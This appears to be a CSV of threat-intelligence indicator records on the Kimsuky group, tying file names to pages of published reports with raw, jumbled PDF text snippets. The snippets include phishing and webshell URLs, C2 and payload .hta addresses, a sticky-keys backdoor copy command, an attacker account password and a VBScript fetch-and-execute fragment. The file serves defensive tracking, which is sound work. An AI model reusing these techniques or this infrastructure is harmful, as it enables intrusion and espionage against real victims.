1.0.0,actor--kimsuky,artifact--sha256:2fe007fb5299cc7b08e77516bc71ae0266dcc9fa6212d2164c3b82da44af315d,observation--sha256:1a59ac3fee2092b2eb4fd664595663d71b4526e562ab2cd6a3bfdb52cacbdb57,file-name,taskmgr.exe,taskmgr.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:83aa4b3e95072a10e67c8dac1af947cfab0a8d1e80c75e11505ace74f35391a8,observation--sha256:d74f91abeb40d9de8824d6da4662bfdbd338f4df061b8ab44cbebc911424e9b4,file-name,termsvc.dll,termsvc.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:83aa4b3e95072a10e67c8dac1af947cfab0a8d1e80c75e11505ace74f35391a8,observation--sha256:bd8e14d9f68fceecb4df6e7b6a445559198d8aaa8f52a67e619b08311d0b038e,file-name,termsvc.dll,termsvc.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:312786f61e6819fd9ae1ad9d52c9e757368bf2b5ffddacb2174d2ac55222f983,observation--sha256:6f5b991a7f7817800921c8de725b5e5403db0c1fe6385960ef07a45509000f50,file-name,test.php,test.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:312786f61e6819fd9ae1ad9d52c9e757368bf2b5ffddacb2174d2ac55222f983,observation--sha256:229ff79f5ec93e6eb8bc2fd2e699f207096cf1b74469ba60bb8e3c14f71d6f43,file-name,test.php,test.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,43 (Figure 31) Phishing waypoint creation code in exploits_builder.py ÿ otp: BASE64 encoded email address of the hacking target ÿ rtnurl: BASE64 encoded Naver mail URL The final phishing destination created through the above (Figure 31) is as follows. (Base64 encoding) aHR0cHM6Ly9tYWlsLm5hdmVyLmNvbQ== ÿ (Base64 decoding)hxxps://mail.naver.com (Figure 30) Body of phishing email in naver.txt [+] Final phishing destination to be inserted into the identity verification button in the email body Opera,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:312786f61e6819fd9ae1ad9d52c9e757368bf2b5ffddacb2174d2ac55222f983,observation--sha256:ae0552f94aa68c3a054428f95b4d0c98ee4f814ab10b8bc3e03dd802bddb96df,file-name,test.php,test.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 44}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://nidlogin.navernnail.com/nidlogin.login?mode=form&url=hx xps%3A%2F%2Fwww.naver.com&locale=ko_KR&svctype=1&otp= hxxps://accounts.googlernails.com/signin/v2/identifier?hl=en&passiv e=true&continue=hxxps%3A%2F%2Fwww.google.com%2F&ec=GAZ AmgQ&flowName=GlifWebSignIn&flowEntry=ServiceLogin&otp= Based on the analysis of espoofer-master_naver.zip so far, the process of sending phishing emails is summarized as shown below (Figure 32). Using the stolen account information, the hacked target's email",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:312786f61e6819fd9ae1ad9d52c9e757368bf2b5ffddacb2174d2ac55222f983,observation--sha256:70ae7ff95b3666fa9facef5368fd98b83aeb328c8533c666cd52912be5f2fc0b,file-name,test.php,test.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cuser.log 'accounts.kakao.com' => 46 Mail)****jIyMi5jb20=&rtnurl=(encoded in BASE64, normal URL)aHR0cHM6Ly9tYWlsLm5hdmVyLmNvbQ==&mode=n Operation Covert Stalker Report 'track.tiara.daum.net' => 'track_tiara_daummt.certuser.info', 'office.com' => 'certuser.info' 'aadcdn.msauth.net' => 'aadcdnmsauthdose.certuser.info', (Table 20) File analysis results obtained from certuser.info kakao The normal URL you access is saved, which is used to avoid suspicion of hacking targets by encouraging access to t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:312786f61e6819fd9ae1ad9d52c9e757368bf2b5ffddacb2174d2ac55222f983,observation--sha256:e09c88d0d988d352473057d342ce56cbfadade22a608f7faa6e7792a28663c7e,file-name,test.php,test.php,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:312786f61e6819fd9ae1ad9d52c9e757368bf2b5ffddacb2174d2ac55222f983,observation--sha256:a9c3f325fd683f2f203c6011808fd6c6c449cd5543ecc21b5ee67012e32c1a37,file-name,test.php,test.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:fbc341a6d5c8ae20c3f76a7018bc94c5ae09c955083ccb570ea0900bc0d3dddd,observation--sha256:c39b6e91665e99fec0c0137bf4f61e51afb2c215eff93f1dd88dfbdc1ea6a269,file-name,tmp1030574661.vbs,tmp1030574661.vbs,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:62623e428469ab626a4d7fe8c6c4731df605379f0d4e0cefd65aa96566cd5c87,observation--sha256:fa78192436e1c2357443879dbcafe8db987cf9371cf4bfabe7f8e9e143ab3da9,file-name,tool.zip,tool.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--9df172e770726627,kimsuky/Joint_CSA_NK_Using_Social_Engineering_20230531.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | DOS | NSA| NIS | NPA | MOFA TLP:CLEAR Page 14 of 21 | Product ID: CSA-20230601-1 TLP:CLEAR Sample email communication 8: Additionally, Kimsuky actors impersonate operators or administrators of popular web portals and claim that a victim’s account has been locked following suspicious activity or fraudulent use. Victims are advised to protect their personal information and unlock their account by clicking a link attached to the email and changing their password. The link leads to a phishing ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:46f0cacfde9c9eb53c4112bccda98998355fb3c3fb848654e0b4fad31ba0457b,observation--sha256:137daa004c63e33d1428fc87381b349792eba839303a2c6271da319b3520b55d,file-name,tygygvftsfx8g68Gu8x7s78gsvseidj6.php,tygygvftsfx8g68Gu8x7s78gsvseidj6.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a65dc67654aadf83c28cf45c91ee961aca9ad329bc2472921eb5b96e3148064,observation--sha256:81fd3fb7c638da69de804dc5b4117ba8a651bc38bbdf99c231f4e39075704d67,file-name,tygygvftsfx8g68Gu8x7s78gsx6.php,tygygvftsfx8g68Gu8x7s78gsx6.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a65dc67654aadf83c28cf45c91ee961aca9ad329bc2472921eb5b96e3148064,observation--sha256:a8d39ce014453613f888d18d59a31cc918120d8385945cbc69135271995c6df3,file-name,tygygvftsfx8g68Gu8x7s78gsx6.php,tygygvftsfx8g68Gu8x7s78gsx6.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 61}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,".eu stat_tiaraosi.kakao mailis.walock.info extparts.info eu The Kimsuky organization also used the three URLs shown in white bold in the above (Table 25) as web shell and phishing URLs. I suspected that a webshell with the same file name exists. ÿ hxxps://healope.info/tygygvftsfx8g68Gu8x7s78gsx6.php (27.255.75.146, e-host webshell URL) mailms.healope.info extparts.info dnleu.kakaoreug.i generalparts.info aocore.eu mailis.walock.info mailweb.afgvillage Operation Covert Stalker Report stat_tiarale",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a65dc67654aadf83c28cf45c91ee961aca9ad329bc2472921eb5b96e3148064,observation--sha256:719457a68dab96d83b5a213586e97aa5895ed120360c92d52fe67814f5c43815,file-name,tygygvftsfx8g68Gu8x7s78gsx6.php,tygygvftsfx8g68Gu8x7s78gsx6.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 78}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The Kimsuky organization connects to 17*.11*.22*.18*(US) via RDP from a domestic transit point (KR) and installs an anti-virus program to block malicious code. 20230509174538 goodsjobs.eu/ LOG_ID_WEB_MAL_BLOCK This is the Green Dinosaur webshell URL for C2 management and operation purposes. The purpose of the phishing URL was explained in ""ÿ March 2023, domestic transit point (KR)."" Finally, marked in pale yellow wetaxces.online LOG_ID_WEB_MAL_BLOCK LOG_ID_WEB_MAL_BLOCK 20230509174651 healope.in",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:033d8652d2e9338fd3d1fbae538d33d142a4243e656fc577b4c8b1bccef5b770,observation--sha256:6ca75752472e86a86752aa08648f07bb3604193e62a17b363f1b87f4786bf308,file-name,tygygvftsfx8g68Gu8x7s78gsx6519.php,tygygvftsfx8g68Gu8x7s78gsx6519.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a9e47df021d74d685d059d8ead572fc406ea015e522b4ff2e7f60989cce93e16,observation--sha256:cb536acdb1860e428bb98fec3c52257feb192f1899515727f6d008a82ccdd032,file-name,tygygvftsfx8g68Gu8x7s78gsxueidj6.php,tygygvftsfx8g68Gu8x7s78gsxueidj6.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:37d055f87794143c1ac47ffb28202c80a6b55823227b39bb316fcac61f9cd72d,observation--sha256:eec06ea078f786cf798737ddc29586d80d9f01fbf344849fc5ce7a49e74cc73a,file-name,u8x7s78gsx6.php,u8x7s78gsx6.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f583b6073033e07757860105ebdf42228d08511522fac7e370f9dd25ab959572,observation--sha256:39b3352d81a86a67c084913ecaf07b797b7d703e3f7eec5e3e358814e97a1f61,file-name,ua.zip,ua.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f583b6073033e07757860105ebdf42228d08511522fac7e370f9dd25ab959572,observation--sha256:58fae9614b22f60970cd9d16eaa938cf15ca0fde0e614dff87286dc7b8cb92df,file-name,ua.zip,ua.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"It has the same structure, and the malicious code downloaded varies depending on the number attached to list.php and lib.php. This means that both PHPs have malware file names mapped to numbers followed by them. Also, sqlite.zip is a file that the malicious code mapped to the number attached to the end of the file downloads additionally for normal execution. On March 20, 2023, a joint security advisory issued by the National Intelligence Service (NIS) and the German Constitutional Protection Age",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f145b6f7b5adff7556b1ee3b80b9cf0828fa0f68d4a1ae6ac4ef5c77e4535d5,observation--sha256:905940e3fa7ccdc0e52e5363adf890ba62fc8f05c37e3b4f0b877e9dc95578b8,file-name,update.exe,update.exe,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:1c9af9fd56f29e9a31d98176ed2ce74f07dc5baf26452fa3c4ce5e3da89ed5ae,file-name,upload.php,upload.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 13}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"In addition, the file name 'upload.php' is used in common for information leakage. The C2 server exploiting the HWP vulnerability is in Korea, and the C2 server exploiting DOC vulnerability contains the subaddress 'kr' in the middle of the address. Also, both files have exactly the same registry key 'VBAWarnings' and the log file name 'ttmp.log'. Many of the traces mentioned above and the similar pattern of server-side attacks are suggesting that both HWP malicious documents found in Korea and t",
1.0.0,actor--kimsuky,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:d1557fdf2255687570a8e45616d059fe6a20888d8568ad1e61714e954b117c3c,file-name,upload.php,upload.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:e130eaa3f399ff0603c4108cae487506b547ee2b424b80365ec9611d16e45546,file-name,upload.php,upload.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:163fae43c2581ccb51733c842f6f1da1c097fac1ff20fa6a61ba7b5ee5f8b8b9,file-name,upload.php,upload.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
1.0.0,actor--kimsuky,artifact--sha256:76ba250b62683ca3be63b4df525381ed837bf468d5ff2fbd677c2d4ff7eaee76,observation--sha256:c4ce7fdfaec6b0f13bc7d1d2c1ddf7f949349691f41b8f6b1b727cd3d5408b3d,file-name,upload.php,upload.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 32}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,upload.php,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5a3f49e5afa3781629b0ce0cd456abd35a1d222c024d4bd265a97f1adda03c74,observation--sha256:83f694c37c5e27670c552142b474c5781e02eb47db446b00c7d243294fc28230,file-name,utilman.exe,utilman.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7a435e6febbc277f2a42f67b397f9b18f554cf86c07a3e8dd136cd6f1b74b0b7,observation--sha256:1168a74c710b567699530f3684c4f3908f93cdf0b587afd30661546fff7023e3,file-name,v.doc.exe,v.doc.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
